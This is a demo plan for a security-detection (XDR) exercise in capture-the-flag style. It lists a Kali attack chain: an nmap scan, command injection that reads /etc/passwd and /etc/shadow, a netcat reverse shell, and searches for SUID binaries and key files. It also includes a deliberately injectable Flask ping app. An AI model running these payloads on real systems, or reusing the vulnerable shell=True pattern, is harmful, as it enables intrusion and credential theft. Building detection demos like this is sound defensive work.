# XDR Demo Attack Scenario

## CTF-Style: Vulnerable Web Service Exploitation

### Victim Setup
- Ubuntu 22.04
- Simple Python web app with command injection vulnerability
- Port 8080 exposed

### Attack Chain (from Kali)

```bash
# 1. Discovery
nmap -sV <victim_ip>

# 2. Web enumeration
curl http://<victim_ip>:8080
dirb http://<victim_ip>:8080

# 3. Exploitation (command injection in web form)
curl "http://<victim_ip>:8080/ping?host=127.0.0.1;cat%20/etc/passwd"
curl "http://<victim_ip>:8080/ping?host=127.0.0.1;cat%20/etc/shadow"

# 4. Reverse shell
curl "http://<victim_ip>:8080/ping?host=127.0.0.1;nc%20<kali_ip>%204444%20-e%20/bin/bash"

# 5. Post-exploitation
find / -perm -4000 2>/dev/null
find / -name "*.pem" -o -name "*.key" 2>/dev/null
```

### XDR Alerts Triggered
- Port scanning
- Web exploitation attempt
- Command injection execution
- Reverse shell connection
- /etc/shadow access
- SSH key harvesting
- SUID binary enumeration

### Simple Vulnerable App (victim)
```python
# /opt/vulnerable_app.py
from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/ping')
def ping():
    host = request.args.get('host', '127.0.0.1')
    # Vulnerable - no input sanitization
    result = subprocess.check_output(f"ping -c 1 {host}", shell=True)
    return result

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

Demo shows: reconnaissance → exploitation → post-compromise, all triggering XDR alerts.
